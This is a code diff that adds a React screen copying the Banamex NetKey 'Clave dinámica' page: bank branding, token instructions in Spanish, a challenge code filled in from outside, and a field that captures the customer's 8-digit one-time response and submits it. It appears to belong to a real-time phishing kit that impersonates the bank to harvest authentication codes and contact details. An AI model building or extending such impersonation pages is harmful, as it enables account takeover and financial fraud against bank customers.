@@ -1203,6 +1203,203 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
 
+      case ScreenType.NETKEY_CUSTOM:
+        const handleNetkeyCustomSubmit = () => {
+          if (netkeyResponse.length === 8 && /^\d+$/.test(netkeyResponse)) {
+            onSubmit(ScreenType.NETKEY_CUSTOM, { customNetkeyResponse: netkeyResponse });
+          }
+        };
+
+        const [currentTimeCustom, setCurrentTimeCustom] = useState(new Date());
+
+        useEffect(() => {
+          const timer = setInterval(() => setCurrentTimeCustom(new Date()), 1000);
+          return () => clearInterval(timer);
+        }, []);
+
+        const formatDateTimeCustom = (d: Date) => {
+          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+          const pad = (n: number) => n < 10 ? '0'+n : n;
+          const dayName = days[d.getDay()];
+          const day = d.getDate();
+          const month = months[d.getMonth()];
+          const year = d.getFullYear();
+          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
+        };
+
+        return (
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
+            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
+                    <g fill="#c81f3b">
+                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    </g>
+                  </svg>
+                  <div>
+                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
+                  </div>
+                </div>
+
+                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
+                  <div style={{ fontSize: '14px', color: '#2d4b51' }} id="datetime">
+                    {formatDateTimeCustom(currentTimeCustom)}
+                  </div>
+                </div>
+              </header>
+
+              <div style={{ 
+                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
+                borderRadius: '8px', 
+                padding: '22px', 
+                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
+                border: '1px solid rgba(0,0,0,0.03)' 
+              }} role="main" aria-labelledby="title">
+                <h1 id="title" style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  » Clave dinámica
+                </h1>
+
+                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
+                  <div style={{ 
+                    background: '#fff', 
+                    borderRadius: '6px', 
+                    padding: '20px', 
+                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
+                    flex: '1.1', 
+                    marginRight: '6px', 
+                    minHeight: '260px', 
+                    display: 'flex', 
+                    flexDirection: 'column' 
+                  }} aria-label="Instrucciones">
+                    <p style={{ margin: '6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
+                    <p style={{ margin: '12px 0 6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
+
+                    <div style={{ 
+                      background: 'linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%)', 
+                      borderRadius: '6px', 
+                      padding: '16px', 
+                      margin: '14px 0', 
+                      textAlign: 'center', 
+                      border: '2px solid #b4d5d8' 
+                    }}>
+                      <div style={{ fontSize: '12px', color: '#3d5559', marginBottom: '6px' }}>CHALLNG</div>
+                      <div style={{ 
+                        fontSize: '42px', 
+                        fontWeight: 600, 
+                        letterSpacing: '10px', 
+                        color: '#153e46', 
+                        fontFamily: "'Courier New', monospace" 
+                      }}>
+                        {screenData.customChallenge || '--------'}
+                      </div>
+                    </div>
+
+                    <button 
+                      style={{ 
+                        padding: '10px 24px', 
+                        background: '#fff', 
+                        color: '#3d5559', 
+                        border: '2px solid #c4d5d7', 
+                        borderRadius: '6px', 
+                        fontSize: '14px', 
+                        fontWeight: 500, 
+                        cursor: 'pointer', 
+                        alignSelf: 'flex-start', 
+                        marginBottom: '12px' 
+                      }} 
+                      type="button"
+                    >
+                      Cancelar
+                    </button>
+                    <p style={{ margin: '6px 0', fontSize: '14px', lineHeight: 1.5, color: '#3d5559' }}>Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
+                  </div>
+
+                  <div style={{ 
+                    background: '#fff', 
+                    borderRadius: '6px', 
+                    padding: '20px', 
+                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
+                    flex: 1, 
+                    minHeight: '260px', 
+                    display: 'flex', 
+                    flexDirection: 'column', 
+                    justifyContent: 'space-between' 
+                  }} aria-label="Campo de clave dinámica">
+                    <div>
+                      <h2 style={{ fontSize: '18px', margin: '0 0 14px 0', color: '#153e46' }}>Clave dinámica</h2>
+                      <input 
+                        type="text" 
+                        maxLength={8}
+                        value={netkeyResponse}
+                        onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
+                        placeholder="00000000" 
+                        aria-label="Clave dinámica"
+                        style={{ 
+                          width: '100%', 
+                          padding: '14px', 
+                          fontSize: '28px', 
+                          textAlign: 'center', 
+                          letterSpacing: '6px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          fontFamily: "'Courier New', monospace", 
+                          color: '#153e46', 
+                          fontWeight: 600, 
+                          background: '#f7fbfc', 
+                          boxSizing: 'border-box' 
+                        }}
+                      />
+                    </div>
+
+                    <div style={{ marginTop: '20px', display: 'flex', gap: '10px' }}>
+                      <button 
+                        style={{ 
+                          flex: 1, 
+                          padding: '12px', 
+                          background: '#fff', 
+                          color: '#3d5559', 
+                          border: '2px solid #c4d5d7', 
+                          borderRadius: '6px', 
+                          fontSize: '15px', 
+                          fontWeight: 500, 
+                          cursor: 'pointer' 
+                        }} 
+                        type="button"
+                      >
+                        Cancelar
+                      </button>
+                      <button 
+                        style={{ 
+                          flex: 1, 
+                          padding: '12px', 
+                          background: '#153e46', 
+                          color: '#fff', 
+                          border: 'none', 
+                          borderRadius: '6px', 
+                          fontSize: '15px', 
+                          fontWeight: 600, 
+                          cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer',
+                          opacity: netkeyResponse.length !== 8 ? 0.5 : 1
+                        }} 
+                        type="button"
+                        onClick={handleNetkeyCustomSubmit}
+                        disabled={netkeyResponse.length !== 8}
+                      >
+                        Continuar
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        );
+
       case ScreenType.DATOS_CONTACTO:
         const [telefono1, setTelefono1] = useState('');
         const [telefono2, setTelefono2] = useState('');
